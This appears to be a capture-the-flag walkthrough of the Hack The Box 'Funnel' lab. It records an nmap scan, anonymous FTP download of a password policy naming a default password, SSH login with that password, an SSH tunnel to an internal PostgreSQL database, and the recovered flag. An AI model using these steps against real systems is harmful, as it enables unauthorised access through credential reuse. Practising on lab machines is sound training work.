Hack the Box
starting point

Funnel

10.129.98.208

┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/bike]
└─$ nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/funnel 10.129.98.208
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 00:05 EDT
Nmap scan report for 10.129.98.208
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.19 seconds

──(kali㉿kali)-[~/…/CTF/HTB/starting_point/funnel]
└─$ ftp 10.129.98.208
Connected to 10.129.98.208.
220 (vsFTPd 3.0.3)
Name (10.129.98.208:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

ftp> cd ./mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||38479|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> get password_policy.pdf
local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||24263|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |*******************************************************************| 58899      325.58 KiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (221.35 KiB/s)
ftp> get welcome_28112022
local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||15164|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |*******************************************************************|   713      344.69 KiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (8.10 KiB/s)

Default passwords — such as those created for new users — must be changed
as quickly as possible. For example the default password of “funnel123#!#” must
be changed immediately.

optimus@funnel.htb 
albert@funnel.htb 
andreas@funnel.htb 
christine@funnel.htb 
maria@funnel.htb

┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/funnel]
└─$ ssh christine@10.129.98.208
christine@10.129.98.208's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 06 Aug 2023 04:26:32 AM UTC

  System load:              0.01
  Usage of /:               61.4% of 4.78GB
  Memory usage:             12%
  Swap usage:               0%
  Processes:                159
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.98.208
  IPv6 address for ens160:  dead:beef::250:56ff:feb0:97c4


christine@funnel:~$ ss -tln
State       Recv-Q       Send-Q             Local Address:Port              Peer Address:Port      Process      
LISTEN      0            4096                   127.0.0.1:5432                   0.0.0.0:*                      
LISTEN      0            4096                   127.0.0.1:38333                  0.0.0.0:*                      
LISTEN      0            4096               127.0.0.53%lo:53                     0.0.0.0:*                      
LISTEN      0            128                      0.0.0.0:22                     0.0.0.0:*                      
LISTEN      0            32                             *:21                           *:*                      
LISTEN      0            128                         [::]:22                        [::]:*                      
christine@funnel:~$ ss -tl
State       Recv-Q      Send-Q           Local Address:Port                 Peer Address:Port      Process      
LISTEN      0           4096                 127.0.0.1:postgresql                0.0.0.0:*                      
LISTEN      0           4096                 127.0.0.1:38333                     0.0.0.0:*                      
LISTEN      0           4096             127.0.0.53%lo:domain                    0.0.0.0:*                      
LISTEN      0           128                    0.0.0.0:ssh                       0.0.0.0:*                      
LISTEN      0           32                           *:ftp                             *:*                      
LISTEN      0           128                       [::]:ssh                          [::]:*    


christine@funnel:~$ psql

Command 'psql' not found, but can be installed with:

apt install postgresql-client-common
Please ask your administrator.

Need to set up local port forwarding

ssh -L 1234:localhost:5432 christine@10.129.98.208
password: funnel123#!#

christine-# \l
                                                  List of databases
   Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges    
-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------
 christine | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
 template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
\c





christine-# \c secrets
psql (15.3 (Debian 15.3-0+deb12u1), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets-# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine


secrets=# SELECT * FROM flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1

